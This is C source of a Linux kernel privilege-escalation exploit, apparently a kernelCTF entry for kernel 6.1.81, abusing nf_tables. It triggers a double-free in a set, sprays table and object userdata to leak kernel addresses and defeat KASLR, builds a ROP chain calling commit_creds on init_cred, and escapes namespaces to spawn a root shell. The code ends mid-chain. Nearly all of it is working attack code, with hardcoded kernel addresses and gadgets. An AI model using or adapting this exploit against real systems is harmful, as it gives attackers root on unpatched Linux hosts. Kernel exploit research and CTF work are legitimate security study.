// kernelCTF{v1:lts-6.1.81:1711326951:9fd62de762dc79784a6124f40a35a0acd6a73965}
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/object.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <signal.h>
#include <sched.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdint.h>

#define SPRAY 128
#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42

#define KEY_LEN 32
#ifndef NFT_SET_CONCAT
#define NFT_SET_CONCAT 128
#endif

#define OPS_NOKASLR 0xffffffff82b2b740
#define NFT_CT_EXPECT_OBJ_TYPE 0xffffffff83b6d0c0
#define INIT_CRED 0xffffffff83876ac0
#define COMMIT_CREDS 0xffffffff811be550
#define FIND_TASK_BY_VPID 0xffffffff811b4f20
#define INIT_NSPROXY 0xffffffff83876880
#define SWITCH_TASK_NAMESPACES 0xffffffff811bc9b0
#define KPTI_TRAMPOLINE 0xffffffff82201186
#define __RCU_READ_UNLOCK 0xffffffff812122b0

#define mnl_batch_limit (1024 * 1024)
char mnl_batch_buffer[2 * mnl_batch_limit];

struct msgp
{
    long mtype;
    char mtext[1];
};

unsigned long cs;
unsigned long rsp;
unsigned long ss;
unsigned long rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rflags), "=r"(rsp)
        :
        : "memory");
}

void replace(unsigned char *data, uint64_t datasz, uintptr_t key, uintptr_t repl)
{
    for (unsigned char *data_end = data + datasz - 8; data < data_end; data++)
    {
        if (*(uintptr_t *)data == key)
        {
            *(uintptr_t *)data = repl;
        }
    }
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t *set = malloc(sizeof(cpu_set_t));

    CPU_ZERO(set);
    CPU_SET(cpu_n, set);

    if (sched_setaffinity(pid, sizeof(set), set) < 0)
    {
        perror("sched_setaffinity");
        return;
    }
    free(set);
}

uint32_t family = NFPROTO_INET;
char *spray_table_name = "spray_table";
char *exploit_table_name = "exploit_table";

char *spray_chain_name = "OUTPUT";
char *exploit_chain_name = "OUTPUT";

struct list_head
{
    struct list_head *next, *prev;
};

struct nftnl_table
{
    struct list_head head;

    const char *name;
    uint32_t family;
    uint32_t table_flags;
    uint64_t handle;
    uint32_t use;
    uint32_t flags;
    uint32_t owner;
    struct
    {
        void *data;
        uint32_t len;
    } user;
};

struct nftnl_expr
{
    struct list_head head;
    uint32_t flags;
    struct expr_ops *ops;
    uint8_t data[];
};

struct nftnl_obj
{
    struct list_head head;
    struct obj_ops *ops;

    const char *table;
    const char *name;

    uint32_t family;
    uint32_t use;

    uint32_t flags;
    uint64_t handle;

    struct
    {
        void *data;
        uint32_t len;
    } user;

    union
    {
        struct nftnl_obj_counter
        {
            uint64_t pkts;
            uint64_t bytes;
        } counter;
        struct nftnl_obj_quota
        {
            uint64_t bytes;
            uint64_t consumed;
            uint32_t flags;
        } quota;
        struct nftnl_obj_ct_helper
        {
            uint16_t l3proto;
            uint8_t l4proto;
            char name[16];
        } ct_helper;
        struct nftnl_obj_ct_timeout
        {
            uint16_t l3proto;
            uint8_t l4proto;
            uint32_t timeout[NFTNL_CTTIMEOUT_ARRAY_MAX];
        } ct_timeout;
        struct nftnl_obj_ct_expect
        {
            uint16_t l3proto;
            uint16_t dport;
            uint8_t l4proto;
            uint8_t size;
            uint32_t timeout;
        } ct_expect;
        struct nftnl_obj_limit
        {
            uint64_t rate;
            uint64_t unit;
            uint32_t burst;
            uint32_t type;
            uint32_t flags;
        } limit;
        struct nftnl_obj_synproxy
        {
            uint16_t mss;
            uint8_t wscale;
            uint32_t flags;
        } synproxy;
        struct nftnl_obj_tunnel
        {
            uint32_t id;
            uint32_t src_v4;
            uint32_t dst_v4;
            struct in6_addr src_v6;
            struct in6_addr dst_v6;
            uint16_t sport;
            uint16_t dport;
            uint32_t flowlabel;
            uint32_t tun_flags;
            uint8_t tun_tos;
            uint8_t tun_ttl;
            union
            {
                struct
                {
                    uint32_t gbp;
                } tun_vxlan;
                struct
                {
                    uint32_t version;
                    union
                    {
                        uint32_t v1_index;
                        struct
                        {
                            uint8_t hwid;
                            uint8_t dir;
                        } v2;
                    } u;
                } tun_erspan;
            } u;
        } tunnel;
        struct nftnl_obj_secmark
        {
            char ctx[NFT_SECMARK_CTX_MAXLEN];
        } secmark;
    } data;
};

struct nftnl_table *create_table(struct mnl_nlmsg_batch *batch, uint32_t seq, char *table_name, void *udata, uint32_t ulen)
{
    struct nftnl_table *table = nftnl_table_alloc();
    if (table == NULL)
    {
        errx(1, "nftnl_table_alloc()");
    }

    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    if (udata != NULL)
    {
        nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, udata, ulen);
    }

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    // nftnl_table_free(table);
    return table;
}

void delete_table(struct mnl_nlmsg_batch *batch, uint32_t seq, char *table_name)
{
    struct nftnl_table *table = nftnl_table_alloc();
    if (table == NULL)
    {
        errx(1, "nftnl_table_alloc()");
    }

    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELTABLE,
        family,
        NLM_F_ACK,
        seq);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nftnl_table_free(table);
}

struct nftnl_set *create_set(struct mnl_nlmsg_batch *batch, uint32_t seq,
                             char *table_name, char *set_name, uint32_t set_id, uint32_t set_flags,
                             uint32_t set_key_len, uint32_t set_desc_len, uint8_t *desc,
                             void *set_userdata, uint32_t set_userdata_len, uint32_t obj_type)
{
    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL)
    {
        errx(1, "nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set, NFTNL_SET_ID, set_id);
    nftnl_set_set_u32(set, NFTNL_SET_FLAGS, set_flags);
    nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, set_key_len);
    if (set_userdata != NULL)
    {
        nftnl_set_set_data(set, NFTNL_SET_USERDATA, set_userdata, set_userdata_len);
    }
    if (desc != NULL)
    {
        nftnl_set_set_data(set, NFTNL_SET_DESC_CONCAT, desc, sizeof(uint8_t) * set_desc_len);
    }
    if (obj_type != 0)
    {
        nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, obj_type);
    }

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSET,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_set_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    return set;
}

static void create_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
                         char *table_name, char *chain_name)
{
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL)
    {
        errx(1, "nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}

static void prepare_nftables(struct mnl_socket *nl)
{
    uint32_t portid, seq, table_seq;
    int ret;

    seq = rand() % (UINT32_MAX / 2);

    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    // table for spray
    create_table(batch, seq++, spray_table_name, NULL, 0);
    create_chain(batch, seq++, spray_table_name, spray_chain_name);

    // table for exploit
    create_table(batch, seq++, exploit_table_name, NULL, 0);
    create_chain(batch, seq++, exploit_table_name, exploit_chain_name);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);

    while (table_seq + 1 != seq)
    {
        ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
        if (ret == -1)
        {
            perror("[-] mnl_socket_recvfrom()");
        }
        ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
        if (ret == -1)
        {
            perror("[-] mnl_cb_run()");
        }
        table_seq++;
    }
}

static void trigger_uaf(struct mnl_socket *nl, size_t size, int *msgqids)
{
    uint32_t seq;
    struct nlmsghdr *nlh;
    struct mnl_nlmsg_batch *batch;
    struct nftnl_set *set;
    char *udata_buf[size];
    char key[KEY_LEN];
    struct nft_set_elem *elem[3];
    memset(udata_buf, 0x41, size);

    int ret;
    int evil_qids[2];

    seq = rand() % (UINT32_MAX / 2);

    // TRANSACTION 1
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // dummy obj (not relevant)
    struct nftnl_obj *obj = nftnl_obj_alloc();
    nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, "pwnobj");
    nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, exploit_table_name);
    nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_CT_EXPECT);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_L4PROTO, IPPROTO_TCP);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_SIZE, 0x41);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_DPORT, 0x4141);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_TIMEOUT, 0x41414141);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWOBJ, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_obj_nlmsg_build_payload(nlh, obj);
    nftnl_obj_free(obj);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);

    // TRANSACTION 2
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // create pipapo set
    uint8_t desc[2] = {16, 16};
    set = create_set(
        batch, seq++, exploit_table_name, "pwn_set", 0x1337,
        NFT_SET_INTERVAL | NFT_SET_OBJECT | NFT_SET_CONCAT, KEY_LEN, 2, &desc, NULL, 0, NFT_OBJECT_CT_EXPECT);

    // commit elems to set
    for (int i = 0; i < 2; i++)
    {
        elem[i] = nftnl_set_elem_alloc();
        memset(key, 0x41 + i, KEY_LEN);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_USERDATA, &udata_buf, size);
        nftnl_set_elem_add(set, elem[i]);
    }

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWSETELEM, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] [-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);

    // TRANSACTION 3
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    set = nftnl_set_alloc();
    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, exploit_table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, "pwn_set");

    // make priv->dirty true
    memset(key, 0xff, KEY_LEN);
    elem[3] = nftnl_set_elem_alloc();
    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
    nftnl_set_elem_set(elem[3], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
    nftnl_set_elem_add(set, elem[3]);

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWSETELEM, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    // double-free commited elems
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_DELSET, family,
                                NLM_F_ACK,
                                seq++);
    nftnl_set_nlmsg_build_payload(nlh, set);
    nftnl_set_free(set);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

void post_exploit(void)
{
    // Let this crash, we will handle segfault
}

void handler(int sig){
    puts("Success!");
    // spin the parent
    if (fork())
    {
        for (;;)
            ;
    }
    // move to safe cpu
    // to prevent access to corrupted freelist
    set_cpu_affinity(1, 0);
    sleep(1);

    // escape pid/mount/network namespace
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    printf("[+] Got root\n");

    // drop root shell
    execlp("/bin/bash", "/bin/bash", NULL);
}

void debug()
{
    puts("[*] pause...");
    getchar();
}

void udata_spray(struct mnl_socket *nl, uint32_t size, uint32_t start, uint32_t count, void *data)
{
    char spray_name[16];
    char udata_buf[size];
    char *dptr = &udata_buf;
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (data)
    {
        dptr = data;
    }

    for (int i = start; i < start + count; i++)
    {
        if (!data)
        {
            memset(udata_buf, 0x30 + i, size);
        }
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        nftnl_table_free(create_table(batch, seq++, spray_name, dptr, size));
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

void deludata_spray(struct mnl_socket *nl, uint32_t start, uint32_t count)
{
    char spray_name[16];
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for (int i = start; i < start + count; i++)
    {
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        delete_table(batch, seq++, spray_name);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

static int table_cb(const struct nlmsghdr *nlh, void *data)
{
    char buf[4096];
    struct nftnl_table **out = (struct nftnl_table **)data;

    struct nftnl_table *table = nftnl_table_alloc();

    if (nftnl_table_nlmsg_parse(nlh, table) < 0)
    {
        perror("nftnl_table_nlmsg_parse");
        goto err_free;
    }

    nftnl_table_snprintf(buf, sizeof(buf), table, NFTNL_OUTPUT_DEFAULT, 0);
    *out = table;
    goto out;

err_free:
    nftnl_table_free(table);
out:
    return MNL_CB_OK;
}

char *getudata(struct mnl_socket *nl, char *table_name)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct nftnl_table *table = nftnl_table_alloc();
    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(buf, NFT_MSG_GETTABLE, family,
                                                       NLM_F_ACK, seq);
    uint32_t portid = mnl_socket_get_portid(nl);
    uint32_t type = NFTNL_OUTPUT_DEFAULT;
    int ret;

    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
    nftnl_table_nlmsg_build_payload(nlh, table);
    nftnl_table_free(table);

    if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }

    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    while (ret > 0)
    {
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        if (ret > 200 && ret < 300)
        {
            mnl_cb_run(buf, ret, seq, portid, table_cb, &table);
            break;
        }
    }
    if (ret < 0)
    {
        perror("[-] mnl_socket_recvfrom");
    }

    char *out = calloc(1, table->user.len);
    memcpy(out, table->user.data, table->user.len);
    return out;
}

void obj_spray(struct mnl_socket *nl, uint32_t start, uint32_t count, void *data, uint32_t dlen)
{
    char spray_name[16];
    struct nlmsghdr *nlh;
    struct nftnl_obj *obj;
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for (int i = start; i < start + count; i++)
    {
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        obj = nftnl_obj_alloc();
        nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, spray_name);
        nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, spray_table_name);
        nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_CT_EXPECT);
        nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_L4PROTO, IPPROTO_TCP);
        nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_SIZE, 0x41);
        nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_DPORT, 0x4141);
        nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_TIMEOUT, 0x41414141);
        if (data)
        {
            nftnl_obj_set_data(obj, NFTNL_OBJ_USERDATA, data, dlen);
        }
        nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWOBJ, family,
                                    NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                    seq++);
        nftnl_obj_nlmsg_build_payload(nlh, obj);
        nftnl_obj_free(obj);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

void DumpHex(const void *data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i)
    {
        printf("%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
        {
            ascii[i % 16] = ((unsigned char *)data)[i];
        }
        else
        {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size)
        {
            printf(" ");
            if ((i + 1) % 16 == 0)
            {
                printf("|  %s \n", ascii);
            }
            else if (i + 1 == size)
            {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8)
                {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

uint64_t obj_ptr = 0;
static int obj_cb(const struct nlmsghdr *nlh, void *data)
{
    char buf[4096];
    struct nftnl_obj **out = (struct nftnl_obj **)data;

    struct nftnl_obj *obj = nftnl_obj_alloc();

    if (nftnl_obj_nlmsg_parse(nlh, obj) < 0)
    {
        perror("nftnl_obj_nlmsg_parse");
        goto err_free;
    }

    nftnl_obj_snprintf(buf, sizeof(buf), obj, NFTNL_OUTPUT_DEFAULT, 0);

    if (!obj->user.data)
    {
        goto out;
    }

    obj_ptr = *(uint64_t *)obj->user.data;
    goto out;

err_free:
    nftnl_obj_free(obj);
out:
    return MNL_CB_OK;
}

void get_obj(struct mnl_socket *nl, char *obj_name, bool leak)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct nftnl_obj *obj = nftnl_obj_alloc();
    struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETOBJ, family,
                                                 NLM_F_ACK, seq);
    uint32_t portid = mnl_socket_get_portid(nl);

    nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);
    nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, spray_table_name);
    nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_CT_EXPECT);
    nftnl_obj_nlmsg_build_payload(nlh, obj);
    nftnl_obj_free(obj);

    if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }

    if (leak)
    {
        int ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0)
        {
            if (ret != 36)
            {
                ret = mnl_cb_run(buf, ret, seq, portid, obj_cb, &obj);
                break;
            }
            ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret < 0)
        {
            perror("[-] mnl_socket_recvfrom");
        }
    }
}

void dump_obj(struct mnl_socket *nl, char *obj_name)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct nftnl_obj *obj = nftnl_obj_alloc();
    struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETOBJ, family,
                                                 NLM_F_ACK, seq);
    uint32_t portid = mnl_socket_get_portid(nl);

    nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);
    nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, spray_table_name);
    nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_CT_EXPECT);
    nftnl_obj_nlmsg_build_payload(nlh, obj);
    nftnl_obj_free(obj);

    if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
}

void del_obj(struct mnl_socket *nl, char *obj_name)
{
    struct nlmsghdr *nlh;
    struct nftnl_obj *obj;
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    obj = nftnl_obj_alloc();
    nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);
    nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, spray_table_name);
    nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_CT_EXPECT);

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_DELOBJ, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_obj_nlmsg_build_payload(nlh, obj);
    nftnl_obj_free(obj);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

void wait_destroyer(void)
{
    usleep(20 * 1000); // let destroyer work finish
}

int main_cg(int argc, char **argv)
{
    struct mnl_socket *nl;

    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL)
    {
        perror("[-] mnl_socket_open()");
    }

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
    {
        perror("[-] mnl_socket_bind()");
    }

    // Setup table and chains
    puts("[*] prepare table and chain");
    prepare_nftables(nl);

    puts("[*] trigger double-free");
    trigger_uaf(nl, 0x88 + 3, NULL);
    wait_destroyer();

    udata_spray(nl, 0xe8, 0, 3, NULL);

    char spray_name[16];
    char *udata[3];
    for (int i = 0; i < 3; i++)
    {
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        udata[i] = getudata(nl, spray_name);
    }
    if (udata[0][0] == udata[2][0])
    {
        puts("[+] got duplicated table");
    }

    // Replace with nft_object
    puts("[*] Info leak");
    deludata_spray(nl, 0, 1);
    wait_destroyer();
    obj_spray(nl, 0, 1, NULL, 0);
    uint64_t *fake_obj = (uint64_t *)getudata(nl, "spray-2");

    uint64_t kaslr_slide = fake_obj[16] - OPS_NOKASLR;
    printf("[*] KASLR slide: 0x%lx\n", kaslr_slide);

    // Leak nft_object ptr using table linked list
    fake_obj[8] = 8;           // ulen = 8
    fake_obj[9] = fake_obj[0]; // udata = list->next
    deludata_spray(nl, 2, 1);
    wait_destroyer();
    udata_spray(nl, 0xe8, 3, 1, fake_obj);

    get_obj(nl, "spray-0", true);
    printf("[*] nft_object ptr: 0x%lx\n", obj_ptr);

    // Fake ops
    uint64_t *rop = calloc(29, sizeof(uint64_t));
    rop[0] = kaslr_slide + 0xffffffff81988647; // push rsi; jmp qword ptr [rsi + 0x39];
    rop[2] = kaslr_slide + NFT_CT_EXPECT_OBJ_TYPE;

    // ROP stage 1
    int pos = 3;

    rop[pos++] = kaslr_slide + __RCU_READ_UNLOCK;
    // commit_creds(&init_cred);
    rop[pos++] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;
    rop[pos++] = kaslr_slide + INIT_CRED;
    rop[pos++] = kaslr_slide + COMMIT_CREDS;

    // task = find_task_by_vpid(1);
    rop[pos++] = kaslr_slide + 0xffffffff8112c7c0; // pop rdi; ret;
    rop[pos++] = 1;
    rop[pos++] = kaslr_slide + FIND_TASK_BY_VPID;
    rop[pos++] = kaslr_slide + 0xffffffff8102e2a6; // pop rsi; ret;
    rop[pos++] = obj_ptr + 0xe0 - 0x66;            // rax -> rdi and resume rop
    rop[pos++] = kaslr_slide + 0xffffffff81caed31; // push rax; jmp qword ptr [rsi + 0x66];

    // switch_task_namespaces(task, &init_nsproxy);
